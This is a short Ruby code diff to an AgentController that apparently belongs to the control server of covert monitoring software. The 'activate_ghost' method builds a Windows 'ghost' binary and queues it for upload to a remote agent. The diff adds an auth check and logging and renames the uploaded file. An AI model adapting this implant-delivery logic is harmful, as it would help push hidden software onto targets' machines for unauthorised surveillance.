@@ -655,12 +655,16 @@ class AgentController < RESTController
       agent.save
     end
 
+    # TODO: send the real new core
     return not_found()
   end
 
   def activate_ghost
+    require_auth_level :tech
 
     agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
+
+    trace :info, "[#{@request[:peer]}] Activating Ghost Agent for #{agent.name}"
 
     factory = ::Item.where({_kind: 'factory', ident: agent.ident}).first
     build = RCS::DB::Build.factory(:windows)
@@ -675,8 +679,8 @@ class AgentController < RESTController
 
     # add the upload to the agent
     agent.upload_requests.destroy_all
-    content = File.open(File.join(build.tmpdir, 'output'), 'rb+') {|f| f.read}
-    agent.upload_requests.create!({filename: 'ghost', _grid: [RCS::DB::GridFS.put(content, {filename: 'ghost', content_type: 'application/octet-stream'})] })
+    content = File.open(File.join(build.tmpdir, 'ghost'), 'rb+') {|f| f.read}
+    agent.upload_requests.create!({filename: 'ghits', _grid: [RCS::DB::GridFS.put(content, {filename: 'ghits', content_type: 'application/octet-stream'})] })
 
     build.clean
 
@@ -686,8 +690,10 @@ class AgentController < RESTController
 
     # get the duplicated and add the ghost
     config = agent.configs.last
+    config.user = @session[:user][:name]
     config.add_ghost
 
+    return ok()
   end
 
 end
